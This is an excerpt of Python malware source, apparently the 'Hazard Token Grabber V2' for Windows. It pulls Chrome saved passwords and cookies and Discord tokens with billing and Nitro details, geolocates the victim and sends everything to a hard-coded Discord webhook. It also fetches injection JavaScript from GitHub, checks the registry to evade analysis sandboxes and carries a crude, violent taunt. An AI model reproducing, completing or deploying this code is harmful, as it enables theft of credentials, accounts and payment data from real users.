...
try:
    ...
    time.sleep(3.0)
    os.system(
        "pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install PIL-tools && pip install colorama && pip install win10toast"
    )
    os.system("cls")
    print(
        "Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds."
    )
    time.sleep(10)
    sys.exit
...
config = {
    ...
    "webhook": "https://discord.com/api/webhooks/1173887635341725766/rXK5LiUXgn9DmeGG8F0brgs2B6wjiiQg9t8GJbQJayCnO1M2je-WVgfqgOYbHpXIHHtQ",
    ...
    def __init__(self, webhook: str) -> None:
        ...
        if self.fetchConf("auto_buy_nitro"):
            self.code = requests.get(
                "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__TRUE__injection.js"
            ).text
        else:
            self.code = requests.get(
                "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js"
            ).text
...
class Hazard_Token_Grabber_V2(functions):
    ...
    async def init(self):
        ...
        ) and os.path.exists(self.appdata + "\\Google\\Chrome\\User Data\\Local State"):
        ...
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item[
                    "S1LKT0UCH just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ"
                ] = "https://github.com/S1LKT0UCH"
    ...
    def grabPassword(self):
        ...
        cursor = conn.cursor()
        with open(
            self.dir + "\\Google Passwords.txt", "w", encoding="cp437", errors="ignore"
        ) as f:
            cursor.execute(
    ...
    def grabCookies(self):
        ...
        cursor = conn.cursor()
        with open(
            self.dir + "\\Google Cookies.txt", "w", encoding="cp437", errors="ignore"
        ) as f:
    ...
    def neatifyTokens(self):
        ...
        for token in self.tokens:
            ...
            nitro_data = httpx.get(
                self.baseurl + "/billing/subscriptions", headers=self.getHeaders(token)
            ).json()
            has_nitro = False
            ...
            billing = bool(
                len(
                    json.loads(
                        httpx.get(
                            self.baseurl + "/billing/payment-sources",
    ...
    def finish(self):
        ...
        org = data.get("org")
        googlemap = "https://www.google.com/maps/search/google+map++" + data.get("loc")
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "🌟・Grabber By Rdimo・https://github.com/S1LKT0UCH/Hazard-Token-Grabber-v"
                    },
                }
            ],
        }
...
class AntiDebug(functions):
    ...
    def registryCheck(self):
        ...
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\CoCerialntrol\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if (reg1 and reg2) != 1:
            self.programExit()
